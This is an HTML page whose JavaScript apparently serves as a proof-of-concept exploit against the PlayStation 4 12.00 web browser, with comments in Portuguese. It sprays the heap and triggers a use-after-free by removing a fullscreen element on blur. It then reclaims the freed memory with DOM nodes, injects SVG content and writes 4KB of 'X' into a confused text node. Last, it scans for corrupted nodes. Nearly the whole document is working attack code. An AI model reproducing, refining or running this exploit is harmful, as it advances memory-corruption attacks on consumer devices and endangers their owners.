
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Reclaim Friendly Fire</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Reclaim Overwrite → Friendly Fire Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO - Nosso novo alvo!)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 PROBE DE FOGO AMIGO (Friendly Fire Scan)
function domOverlapProbe(fsTarget){
    log("---- FRIENDLY FIRE PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 💣 DISPARA O TIRO DE 4KB DE "X"
            try{
                n.data = "X".repeat(0x1000); 
                log("[PWN] Overwrite disparado na arena do Reclaim");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCANNER DOS OBJETOS DO RECLAIM
            try{
                // Pega TODOS os H1 da página (isso inclui os do Reclaim)
                let h1s = document.getElementsByTagName("h1");
                let hits = 0;

                for(let i=0; i<h1s.length; i++){
                    let texto = h1s[i].textContent;

                    // Pula o H1 principal da tela cheia
                    if(texto && texto.includes("FULLSCREEN")) continue;

                    // Se não tem "CONTROL", ou se tem "X", nós corrompemos ele!
                    if(texto && (!texto.includes("CONTROL") || texto.includes("XXXX"))){
                        
                        log("[$$$] JACKPOT! TextNode do Reclaim corrompido!");
                        
                        // Imprime um preview do lixo que sobrou no objeto
                        log("[$$$] Preview: " + texto.substring(0, 30) + "...");
                        hits++;
                        
                        // Paramos no primeiro que acharmos para não inundar o log
                        return; 
                    }
                }

                if(hits === 0){
                    log("[SCAN] Reclaim nodes intactos.");
                }

            }catch(e){
                log("[UAF] scan crash");
            }
        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN (Super limpo, sem sprays externos)
function runTest(){
    log("[*] Iniciando teste (Friendly Fire)...");
    
    // Apenas aloca os arrays básicos para pressão de memória obrigatória
    window.heap_press = setupHeap(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
